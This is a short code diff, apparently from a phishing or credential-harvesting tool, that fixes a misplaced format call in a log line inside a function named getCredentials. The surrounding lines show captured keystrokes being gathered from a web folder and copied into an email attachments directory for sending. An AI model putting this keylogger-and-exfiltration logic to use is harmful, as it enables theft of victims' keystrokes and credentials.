@@ -937,8 +937,8 @@ def getCredentials(port):
             if len(lines) != 0:
                 writeLog(
                     '{0}...............................'.format(MAIN0, MAIN4))
-                writeLog(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}{1}').format(
-                    MAIN3, MAIN2, lines)
+                writeLog(
+                    ' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}{1}'.format(MAIN3, MAIN2, lines))
                 system('touch Server/CapturedData/KeyloggerData.txt && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt && cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
                 writeLog(
                     '{0}...............................'.format(MAIN0, MAIN4))
